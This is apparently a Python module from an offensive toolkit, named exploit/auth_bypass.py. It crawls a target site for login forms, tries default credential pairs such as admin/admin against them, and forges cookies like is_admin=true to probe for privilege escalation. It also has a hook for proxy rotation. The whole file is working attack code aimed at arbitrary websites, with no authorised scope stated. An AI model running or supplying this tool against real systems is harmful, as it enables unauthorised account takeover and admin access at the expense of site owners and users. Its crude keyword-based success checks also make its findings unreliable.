# exploit/auth_bypass.py - Authentication Bypass Module
import requests, re, time
from urllib.parse import urljoin
from bs4 import BeautifulSoup

class AuthBypass:
    def __init__(self, proxy_rotator=None):
        self.session = requests.Session()
        self.proxy_rotator = proxy_rotator
    
    def find_login_pages(self, url):
        login_pages = []
        
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for form in soup.find_all('form'):
                has_password = False
                for input_tag in form.find_all('input'):
                    if input_tag.get('type', '').lower() == 'password':
                        has_password = True
                        break
                
                if has_password:
                    action = form.get('action', '')
                    if action:
                        login_url = urljoin(url, action)
                        login_pages.append({
                            'url': login_url,
                            'method': form.get('method', 'GET').upper()
                        })
            
            return login_pages
            
        except Exception as e:
            print(f"Error finding login pages: {e}")
            return []
    
    def test_default_credentials(self, url, credentials_file=None):
        results = []
        credentials = [('admin', 'admin'), ('admin', 'password'), ('guru', 'guru')]
        
        login_pages = self.find_login_pages(url)
        
        if not login_pages:
            return results
        
        for login_page in login_pages:
            for username, password in credentials:
                success = self.test_credential(login_page, username, password)
                
                if success:
                    results.append({
                        'login_page': login_page['url'],
                        'username': username,
                        'password': password,
                        'status': 'SUCCESS'
                    })
                    print(f"  [✓] {username}:{password} - SUCCESS")
                    break
        
        return results
    
    def test_credential(self, login_page, username, password):
        try:
            if login_page['method'] == 'POST':
                data = {'username': username, 'password': password}
                response = self.session.post(
                    login_page['url'],
                    data=data,
                    timeout=10,
                    allow_redirects=True
                )
            else:
                params = {'username': username, 'password': password}
                response = self.session.get(
                    login_page['url'],
                    params=params,
                    timeout=10,
                    allow_redirects=True
                )
            
            if 'logout' in response.text.lower() or 'dashboard' in response.text.lower():
                return True
            
            return False
            
        except:
            return False
    
    def cookie_manipulation(self, url):
        manipulations = [
            {'name': 'user', 'value': 'admin'},
            {'name': 'role', 'value': 'admin'},
            {'name': 'is_admin', 'value': 'true'}
        ]
        
        results = []
        
        try:
            response = self.session.get(url, timeout=5)
            original_cookies = dict(self.session.cookies)
            
            for manipulation in manipulations:
                self.session.cookies.clear()
                for name, value in original_cookies.items():
                    self.session.cookies.set(name, value)
                self.session.cookies.set(manipulation['name'], manipulation['value'])
                
                test_response = self.session.get(url, timeout=5)
                
                result = {
                    'cookie_name': manipulation['name'],
                    'cookie_value': manipulation['value'],
                    'success': False
                }
                
                if test_response.status_code == 200:
                    if 'admin' in test_response.text.lower():
                        result['success'] = True
                
                results.append(result)
            
        except Exception as e:
            print(f"Cookie manipulation error: {e}")
        
        return results
